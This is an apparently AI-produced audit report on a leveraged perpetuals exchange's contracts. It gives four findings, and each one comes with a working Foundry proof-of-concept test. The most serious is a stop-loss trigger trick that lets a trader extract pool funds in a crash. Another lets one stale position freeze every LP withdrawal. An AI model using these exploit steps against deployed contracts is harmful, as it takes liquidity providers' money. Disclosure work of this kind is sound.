# Audit report

> Audit brief (pepesfamily/perps/AUDIT.md). It tells the auditors:
> how the system works and which files are in scope;
> the eight things that must always hold, e.g. the money always adds up and no trader can take more than the rules allow;
> every admin power, and the known limits so they aren’t reported again;
> where to look hardest.
> Scope: the exchange, the pool, the one-click router, the three price feeds, the shared math and the deploy scripts. The keeper, the relayer and the website are left out.
> Builds from a fresh copy: the contracts’ libraries are now linked properly. I cloned the repo from GitHub fresh, as an auditor would, and all 211 tests pass.

| | |
|---|---|
| Repository | https://github.com/0xtenang/PepesFamily.git |
| Commit | `19ac59ab122908a4eace87780127a43dbf7c3275` |
| Job | `1425b92e-2a79-4c8e-9ba8-fa2163df4825` |
| Judged | 2026-10-30 08:41 UTC |
| Findings | 1 high · 2 medium · 1 low |

Four agents audited the code as it is at `19ac59a`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. High: closeByTrigger clamps the live price to within openBandSpotTicks of the fast price, so an owner-armed stop-loss exits a crash at about fast-5% and the pool pays the rest of the gap

`perps/contracts/src/libraries/LevLogic.sol:121`

```
        if (isLong && e < int256(fast) - band) e = int256(fast) - band;
```

Merged from audit_economics (6a37599d), audit_permissions (628d9759) and audit_flow (7d873693): all three describe the same mechanism and fix. close() prices a long's exit at min(spot, fast) with no floor (LevExchange._closePosition). closeByTrigger prices it with LevLogic.triggerExit, which floors the live price at fast - openBandSpotTicks (488 ticks, ~5% by default). Line 122 does the same for shorts with a cap at fast + band. The clamp exists so a third-party keeper can't push the exit price. But setTriggers only refuses a level the fast price has already reached, so the owner can set stopLoss = fast - 1. closeByTrigger has no owner restriction (the owner just gets no reward). So when the live price crashes far below the lagging fast price (a 60 s V3 TWAP, or a median of 3 V4 samples), the first one-tick dip in fast fires the trigger. The owner then exits at about fast - 5% when close() would pay at the live price, which is often a full loss. The pool pays the difference (_finish books held - payout against the pool). This breaks invariant 2 (the worse-of-live-and-fast fill) and invariant 8 (a trigger can't be used as a close at the lagging fast price). Any ordinary stop-loss user on a lagging feed gets the same guaranteed-stop subsidy. Fix (keeps the anti-push intent): in closeByTrigger, while the feed is live, revert NotTriggered if |spot - fast| > openBandSpotTicks, and price the exit like _closePosition (worse of spot and fast, pump band, spread) with no clamp. Or keep the clamp but never pay more than the close price: long exit = min(triggerExit, closeExit), mirrored for shorts. Add a regression test under the default RiskConfig; test_R3_1_triggerExitCountsTheLivePrice uses the neutral 30k-tick band and never reaches the clamp.

**Reproduction**

Ran the attached proof (from specialist 6a37599d). Default RiskConfig (openBandSpotTicks 488), pool 50 ETH, liquidity 4000 ETH. Alice opens a 5x long with 1 ETH stake at tick 0. 60 s later the oracle reports spot -3567 (-30%), fast 0. Alice calls setTriggers(id,false,0,true,-1), which is accepted. Then fast = -1. close(id, MIN_TICK) pays 0 (a liquidation). closeByTrigger(id) called by Alice exits at max(-3567, -1-488) = -489 minus spread and pays 0.7157 ETH from the pool. Result: FAIL 'a trigger close must not pay more than a close at the worse of live and fast: 715681687027590845 > 0'. The other two specialist proofs also fail for the same reason: 0.0711 ETH vs 0 at a 50% crash, and 9.8825 vs 9.596 ETH balance with spread disabled.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {LevExchange} from "src/LevExchange.sol";
import {LevExchangeAdmin} from "src/LevExchangeAdmin.sol";
import {LevPool} from "src/LevPool.sol";
import {LevLens} from "src/LevLens.sol";
import {RiskConfig} from "src/LevTypes.sol";
import {ILevPool, ILevExchange, ILevNav} from "src/interfaces/ILevPool.sol";
import {MockOracle} from "src/mocks/MockOracle.sol";

/// A long's owner arms a stop-loss one tick under the fast price while the live price has already crashed far
/// below it. One tick of fast movement later, closeByTrigger prices the exit at fast - openBandSpotTicks, far
/// better than the "worse of live and fast" a close gives. Fails while the trigger payout exceeds the close payout.
contract TriggerBeatsCloseTest is Test {
    LevPool pool;
    LevExchange ex;
    LevExchangeAdmin exa;
    LevLens lens;
    MockOracle o0;

    address owner = makeAddr("owner");
    address treasury = makeAddr("treasury");
    address lp = makeAddr("lp");
    address alice = makeAddr("alice");

    function setUp() public {
        vm.warp(1_750_000_000);
        pool = new LevPool{value: 0.001 ether}(owner);
        ex = new LevExchange(ILevPool(address(pool)), owner, treasury, address(new LevExchangeAdmin()));
        exa = LevExchangeAdmin(payable(address(ex)));
        lens = new LevLens(ex);
        vm.startPrank(owner);
        pool.setExchange(ILevExchange(address(ex)));
        pool.setNavSource(ILevNav(address(lens)));
        // the production risk rules: a 5% live-vs-fast band
        exa.setRiskConfig(
            RiskConfig({
                openBandSpotTicks: 488,
                openBandTrendTicks: 1823,
                pumpBandTicks: 4055,
                spreadBaseBps: 10,
                spreadImpactBps: 20_000,
                spreadMaxBps: 300,
                sizeTier5xBps: 10,
                sizeTier2xBps: 25,
                hourlyGrowthBps: 5000,
                platformSizeBps: 30_000
            })
        );
        vm.stopPrank();
        o0 = new MockOracle(0, 4000 ether);
        vm.prank(owner);
        exa.listMarket(o0, 10, 100 ether);
        vm.deal(lp, 100 ether);
        vm.prank(lp);
        pool.deposit{value: 50 ether}();
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        ex.deposit{value: 5 ether}();
    }

    function test_stopLossArmedOneTickAwayBeatsClose() public {
        vm.prank(alice);
        uint256 id = ex.open(0, true, 5, 1 ether, type(int24).max);
        vm.warp(block.timestamp + 60);

        // The coin crashes 30% live; the fast average has not moved yet.
        o0.set(-3567, 0, 0);
        // The stop is below the fast price, so setTriggers accepts it.
        vm.prank(alice);
        exa.setTriggers(id, false, 0, true, -1);
        // One tick of fast movement arms it. The live price is still -30%.
        o0.set(-3567, -1, 0);

        uint256 snap = vm.snapshotState();
        uint256 b0 = ex.balanceOf(alice);
        uint256 poolCash0 = pool.cash();
        vm.prank(alice);
        ex.close(id, type(int24).min);
        uint256 viaClose = ex.balanceOf(alice) - b0;
        uint256 poolAfterClose = pool.cash();

        vm.revertToState(snap);
        vm.prank(alice);
        ex.closeByTrigger(id);
        uint256 viaTrigger = ex.balanceOf(alice) - b0;
        uint256 poolAfterTrigger = pool.cash();

        emit log_named_uint("payout via close", viaClose);
        emit log_named_uint("payout via trigger", viaTrigger);
        emit log_named_uint("pool cash after close", poolAfterClose);
        emit log_named_uint("pool cash after trigger", poolAfterTrigger);
        assertLe(viaTrigger, viaClose, "a trigger close must not pay more than a close at the worse of live and fast");
        assertGe(poolAfterTrigger, poolAfterClose, "the pool must not lose more through the trigger path");
        poolCash0;
    }
}
```

### 2. Medium: Side-level loss floor lets a bankrupt long's excess loss cancel other longs' wins, so the NAV withdrawals pay at is too high until it is liquidated

`perps/contracts/src/libraries/LevLogic.sol:171`

```
        int256 floor = -int256(s.stake + (withMargin ? s.margin : 0));
```

From audit_math (4c60629c). sideLiability floors the whole side's P&L at -(sum of stakes), not each position's P&L at -(its own stake). A position whose loss is past its stake (liquidation lagging a gap move) nets its unpayable extra loss against other same-side winners. LevLens.liabilityRange then understates owedHigh, so LevPool.nav() (cash - owedHigh), the value withdrawals pay out at, is overstated. This breaks invariant 4: withdrawals should pay the lowest plausible value. It is the loss-floor counterpart of the known 'capped winners' limit, but it moves value the other way (it overpays withdrawers). Bounding winners per position would not fix it. Nothing pushes third parties to clear these positions: liquidating a position with equity <= 0 pays a keeper reward of 0. Fix: floor each position individually, or treat the market as blocked (valuationOk false) while any position is past its stake at the valuation ticks.

**Reproduction**

Neutral risk, LP 8 ETH, MockOracle with 4000 ETH liquidity. Alice opens a 2x long with 0.5 ETH stake at tick 0. setAll(6932); Bob opens a 10x long with 0.1 ETH stake. setAll(2000): Bob's pnl is -0.389 ETH against a 0.1 ETH stake. pool.nav() is 8172675273682695772 before liquidate(bob) and 7883359454992142861 after. Expected: liquidating a bankrupt loser doesn't lower the withdrawal value, because his loss is capped at his stake either way. Actual: NAV was overstated by 0.289 ETH (= 0.389 - 0.1). Proof fails with 'nav overstated while bankrupt long is open: 8172675273682695772 > 7883359454992142861'.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {LevExchange} from "src/LevExchange.sol";
import {LevExchangeAdmin} from "src/LevExchangeAdmin.sol";
import {LevPool} from "src/LevPool.sol";
import {LevLens} from "src/LevLens.sol";
import {RiskConfig} from "src/LevTypes.sol";
import {ILevPool, ILevExchange, ILevNav} from "src/interfaces/ILevPool.sol";
import {MockOracle} from "src/mocks/MockOracle.sol";

contract SideFloorTest is Test {
    LevPool pool;
    LevExchange ex;
    LevExchangeAdmin exa;
    MockOracle o0;
    address owner = makeAddr("owner");
    address lp = makeAddr("lp");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        vm.warp(1_750_000_000);
        pool = new LevPool{value: 0.001 ether}(owner);
        ex = new LevExchange(ILevPool(address(pool)), owner, makeAddr("treasury"), address(new LevExchangeAdmin()));
        exa = LevExchangeAdmin(payable(address(ex)));
        LevLens lens = new LevLens(ex);
        vm.startPrank(owner);
        pool.setExchange(ILevExchange(address(ex)));
        pool.setNavSource(ILevNav(address(lens)));
        exa.setRiskConfig(RiskConfig({openBandSpotTicks: 30_000, openBandTrendTicks: 30_000, pumpBandTicks: 30_000,
            spreadBaseBps: 0, spreadImpactBps: 0, spreadMaxBps: 0, sizeTier5xBps: 500, sizeTier2xBps: 500,
            hourlyGrowthBps: 60_000, platformSizeBps: 100_000}));
        o0 = new MockOracle(0, 4000 ether);
        exa.listMarket(o0, 10, 5 ether);
        vm.stopPrank();
        vm.deal(lp, 100 ether);
        vm.prank(lp);
        pool.deposit{value: 8 ether}();
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        ex.deposit{value: 10 ether}();
        vm.deal(bob, 10 ether);
        vm.prank(bob);
        ex.deposit{value: 10 ether}();
    }

    function test_sideFloor() public {
        vm.prank(alice);
        ex.open(0, true, 2, 0.5 ether, type(int24).max);
        o0.setAll(6932);
        vm.warp(block.timestamp + 60);
        vm.prank(bob);
        uint256 b = ex.open(0, true, 10, 0.1 ether, type(int24).max);
        o0.setAll(2000);
        vm.warp(block.timestamp + 60);
        uint256 before = pool.nav();
        ex.liquidate(b);
        uint256 afterL = pool.nav();
        console.log(before, afterL);
        assertLe(before, afterL, "nav overstated while bankrupt long is open");
    }
}
```

### 3. Medium: One open position on a market whose feed has died blocks every LP deposit and withdrawal indefinitely; no permissionless or admin path can clear it

`perps/contracts/src/LevLens.sol:112`

```
            if (!ok || m.ruggedPending != 0 || LevLogic.isRug(c, spot, slow) || LevLogic.isRug(c, fast, slow)) {
```

From audit_economics (c73d0c8c). The brief says valuation pauses while a feed is down, so the pause itself is intended. The defect is that the pause has no end. liabilityRange sets blocked whenever a market with open size has a reverting feed, even after the exchange itself treats the market as settleable at lastGoodFast (_requireStale). The lens already values it at that price. A position that is not liquidatable, not at max win and has no trigger can only be closed by its owner: setMarket can't force-close, the oracle is immutable per market, and no admin function moves positions. So while any such position stays open, deposit, requestWithdraw and withdraw all revert with ValuationPaused (LevPool.valuationOk), freezing all LP cash. Matured withdraw requests also expire after withdrawWindow and restart the cooldown. Fix: once the market meets the exchange's own stale condition, value it at lastGoodFast/lastGoodTick without setting blocked. Keep blocking for the first staleSeconds and for rugs. Optionally add a permissionless settle-at-stale-price for positions on long-dead feeds.

**Reproduction**

Ran the attached proof (from specialist c73d0c8c). LP cash 20 ETH. Alice opens a 1x long with 0.01 ETH stake, then addMargin(id, 1 ether). The oracle starts reverting, and refresh(0) is called every 100 s for a day, so the stale path is live. liquidate reverts NotLiquidatable, closeAtMaxWin reverts NotAtMaxWin, closeByTrigger reverts NotTriggered, and setMarket changes nothing. lens.liabilityRange() returns blocked == true and pool.requestWithdraw reverts ValuationPaused. Result: FAIL 'a stale market should be valued at its last good price, not block the pool'.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {LevExchange} from "src/LevExchange.sol";
import {LevExchangeAdmin} from "src/LevExchangeAdmin.sol";
import {LevExchangeBase} from "src/LevExchangeBase.sol";
import {LevPool} from "src/LevPool.sol";
import {LevLens} from "src/LevLens.sol";
import {ILevPool, ILevExchange, ILevNav} from "src/interfaces/ILevPool.sol";
import {MockOracle} from "src/mocks/MockOracle.sol";

/// One position on a coin whose feed has died keeps LevLens.liabilityRange `blocked`, so every LP deposit and
/// withdrawal reverts, for as long as that position stays open. The exchange itself settles such positions at the
/// last good fast price once the feed is stale, but the valuation never does. The position is not liquidatable
/// (margin), not at max win, has no trigger, and no admin function can close it.
contract StaleMarketFreezesLPsTest is Test {
    LevPool pool;
    LevExchange ex;
    LevExchangeAdmin exa;
    LevLens lens;
    MockOracle o0;

    address owner = makeAddr("owner");
    address treasury = makeAddr("treasury");
    address lp = makeAddr("lp");
    address alice = makeAddr("alice");

    function setUp() public {
        vm.warp(1_750_000_000);
        pool = new LevPool{value: 0.001 ether}(owner);
        ex = new LevExchange(ILevPool(address(pool)), owner, treasury, address(new LevExchangeAdmin()));
        exa = LevExchangeAdmin(payable(address(ex)));
        lens = new LevLens(ex);
        vm.startPrank(owner);
        pool.setExchange(ILevExchange(address(ex)));
        pool.setNavSource(ILevNav(address(lens)));
        vm.stopPrank();
        o0 = new MockOracle(0, 400 ether);
        vm.prank(owner);
        exa.listMarket(o0, 10, 5 ether);
        vm.deal(lp, 100 ether);
        vm.prank(lp);
        pool.deposit{value: 20 ether}();
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        ex.deposit{value: 5 ether}();
    }

    function test_oneStalePositionBlocksLPWithdrawalsIndefinitely() public {
        vm.prank(alice);
        uint256 id = ex.open(0, true, 1, 0.01 ether, type(int24).max);
        vm.prank(alice);
        exa.addMargin(id, 1 ether);

        // The feed dies for good. Keepers keep pinging, so the stale clock runs and the exchange settles at the
        // last good fast price.
        o0.setFailing(true);
        exa.refresh(0);
        for (uint256 i; i < 864; ++i) {
            // a day of failed reads, pinged every 100 s (inside STALE_PING_GAP)
            vm.warp(vm.getBlockTimestamp() + 100);
            exa.refresh(0);
        }

        // Nobody but the owner can close it.
        vm.expectRevert(LevExchangeBase.NotLiquidatable.selector);
        ex.liquidate(id);
        vm.expectRevert(LevExchangeBase.NotAtMaxWin.selector);
        ex.closeAtMaxWin(id);
        vm.expectRevert(LevExchangeBase.NotTriggered.selector);
        ex.closeByTrigger(id);
        // Pausing the coin changes nothing for valuation.
        vm.prank(owner);
        exa.setMarket(0, false, 10, 5 ether);

        // The exchange considers the market settleable at the last good price...
        assertTrue(lens.getPosition(id).action == lens.ACTION_NONE());
        // ...but every LP is locked out: 20 ETH of LP cash against a 0.01 ETH position on a dead coin.
        (,, bool blocked) = lens.liabilityRange();
        assertFalse(blocked, "a stale market should be valued at its last good price, not block the pool");
        vm.prank(lp);
        pool.requestWithdraw(pool.balanceOf(lp));
    }
}
```

### 4. Low: closeAtMaxWin pays the keeper share to the position's own owner (closeByTrigger withholds it)

`perps/contracts/src/LevExchange.sol:135`

```
        _finish(id, p, m, c, pnl, EXIT_MAX_WIN, msg.sender);
```

Merged from audit_permissions (8c014e23), audit_flow (f186a539) and audit_math (e789cc1d). Rule 8 says the owner gets no keeper share for closing their own position. closeByTrigger enforces this with `msg.sender == p.owner ? address(0) : msg.sender`, but closeAtMaxWin passes msg.sender unconditionally. _outcome then pays keeperRewardBps (25%) of the fees to the owner, cutting the treasury and pool fee shares by the same amount. liquidate (LevExchange.sol:121) has the same pattern: a self-liquidation with leftover equity pays the owner 25% of it. That case was not reproduced separately. Related, and also reported by audit_economics (b7a6a9ec): the owner check on any path is only an address check, so the owner calling from a second address still collects the share. That is inherent to the rule and is best documented as a limit rather than claimed as a guarantee. Fix: pass `msg.sender == p.owner ? address(0) : msg.sender` in closeAtMaxWin and liquidate.

**Reproduction**

Neutral risk, LP 8 ETH. Alice opens a 10x long with 0.1 ETH stake at tick 0 (max win 0.4 ETH). setAll(4700), wait 60 s. close(id) credits Alice 0.455 ETH. In the same state, Alice calling closeAtMaxWin(id) credits 0.46625 ETH: the extra is 25% of the 0.045 ETH fee, paid as a keeper reward. Proof fails with 'owner got a keeper share via closeAtMaxWin: 466250000000000000 != 455000000000000000'.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {LevExchange} from "src/LevExchange.sol";
import {LevExchangeAdmin} from "src/LevExchangeAdmin.sol";
import {LevPool} from "src/LevPool.sol";
import {LevLens} from "src/LevLens.sol";
import {RiskConfig} from "src/LevTypes.sol";
import {ILevPool, ILevExchange, ILevNav} from "src/interfaces/ILevPool.sol";
import {MockOracle} from "src/mocks/MockOracle.sol";

contract MaxWinSelfKeeperTest is Test {
    LevPool pool;
    LevExchange ex;
    LevExchangeAdmin exa;
    MockOracle o0;
    address owner = makeAddr("owner");
    address lp = makeAddr("lp");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        vm.warp(1_750_000_000);
        pool = new LevPool{value: 0.001 ether}(owner);
        ex = new LevExchange(ILevPool(address(pool)), owner, makeAddr("treasury"), address(new LevExchangeAdmin()));
        exa = LevExchangeAdmin(payable(address(ex)));
        LevLens lens = new LevLens(ex);
        vm.startPrank(owner);
        pool.setExchange(ILevExchange(address(ex)));
        pool.setNavSource(ILevNav(address(lens)));
        exa.setRiskConfig(RiskConfig({openBandSpotTicks: 30_000, openBandTrendTicks: 30_000, pumpBandTicks: 30_000,
            spreadBaseBps: 0, spreadImpactBps: 0, spreadMaxBps: 0, sizeTier5xBps: 500, sizeTier2xBps: 500,
            hourlyGrowthBps: 60_000, platformSizeBps: 100_000}));
        o0 = new MockOracle(0, 4000 ether);
        exa.listMarket(o0, 10, 5 ether);
        vm.stopPrank();
        vm.deal(lp, 100 ether);
        vm.prank(lp);
        pool.deposit{value: 8 ether}();
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        ex.deposit{value: 10 ether}();
        vm.deal(bob, 10 ether);
        vm.prank(bob);
        ex.deposit{value: 10 ether}();
    }

    function test_maxWinSelfKeeper() public {
        vm.prank(alice);
        uint256 id = ex.open(0, true, 10, 0.1 ether, type(int24).max);
        o0.setAll(4700);
        vm.warp(block.timestamp + 60);
        uint256 b0 = ex.balanceOf(alice);
        uint256 snap = vm.snapshotState();
        vm.prank(alice);
        ex.close(id, type(int24).min);
        uint256 viaClose = ex.balanceOf(alice) - b0;
        vm.revertToState(snap);
        vm.prank(alice);
        ex.closeAtMaxWin(id);
        uint256 viaMax = ex.balanceOf(alice) - b0;
        console.log(viaClose, viaMax);
        assertEq(viaMax, viaClose, "owner got a keeper share via closeAtMaxWin");
    }
}
```

---

Judge's submission `f65d4fac26381e9b4c77422d35664da92e26cbcb9a29f5cfdac1bb8069a9bcba`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
